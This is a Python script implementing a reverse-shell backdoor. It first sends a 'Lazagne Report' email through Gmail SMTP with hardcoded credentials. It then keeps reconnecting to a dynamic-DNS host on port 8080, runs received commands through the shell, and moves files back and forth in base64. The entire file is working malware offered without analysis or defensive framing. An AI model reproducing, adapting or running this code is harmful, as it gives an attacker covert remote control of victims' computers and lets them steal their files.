# -*- encoding: utf8 -*-

from __future__ import absolute_import, division, print_function, \
    unicode_literals

import base64
import json
import os
import random
import shutil
import socket
import subprocess
import time
import sys
import smtplib

from subprocess import CalledProcessError

email = 'aryabenstark2@gmail.com'
password = 'fakemail123'


def send_mail(message):
    msg2send = """
       Subject: Lazagne Report

       Report :
       {0}


       """.format(str(message))
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, msg2send)
    server.quit()

class MkBackd:
    def __init__(self):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connected = False

    def connect(self, port, ddns=None, ip=None):

        while not self.connected:
            try:
                if ddns:
                    final_ip = socket.gethostbyname(ddns)
                else:
                    final_ip = ip

                self.connection.connect((final_ip, port))
                self.connected = True
                return self.connection
            except:
                self.connected = False
                sleep_for = random.randrange(1, 10)
                time.sleep(sleep_for)  # Sleep for a random time between 1-10 seconds
                # time.sleep( sleep_for * 60 )  #Sleep for a random time between 1-10 minutes
                pass


    def reliable_send(self, data):
        try:
            json_data = json.dumps(data)
        except TypeError:
            json_data = json.dumps(data.decode("ISO-8859-1"))
        except UnicodeDecodeError:
            json_data = json.dumps(data, encoding='ISO-8859-1')

        try:
            self.connection.send(json_data)
        except TypeError:
            self.connection.send(bytes(json_data))

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(2048)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def change_working_directory_to(self, path):
        try:
            os.chdir(path)
            return "[+] Changing directory to " + os.getcwd()
        except:
            return "Bad Path"

    def read_file(self, path):
        try:
            with open(path, 'rb') as file:
                return base64.b64encode(file.read())
        except IOError:
            return "No such file or directory: " + path

    def write_file(self, path, content):
        if content == 'No such file or directory: ' + path:
            return content
        else:
            with open(path, 'wb') as file:
                file.write(base64.b64decode(content))
                return "[+] download successful"


    def run(self):

        try:
            reload(sys)
            sys.setdefaultencoding('ISO-8859-1')
        except:
            pass

        file_path = ""
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == 'exit':
                    self.connection.close()
                    sys.exit()
                elif command[0] == 'cd' and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == 'download' and len(command) > 1:
                    command_result = self.read_file(command[1])
                elif command[0] == 'upload' and len(command) > 1:
                    command_result = self.write_file(command[1], command[2])
                    command_result = self.read_file(file_path)
                else:
                    command_result = self.execute_system_command(command)

                self.reliable_send(command_result)
            except CalledProcessError:
                self.reliable_send("Can't execute command")


send_mail('MacOs')
my_bachdoor = MkBackd()
while not my_bachdoor.connected:
    try:
        my_bachdoor.connect(8080, ddns='m0dd0y.dynu.net')
        my_bachdoor.run()
    except Exception as ex:
        sleep_for = random.randrange(1, 10)
        time.sleep(sleep_for)
        my_bachdoor = MkBackd()
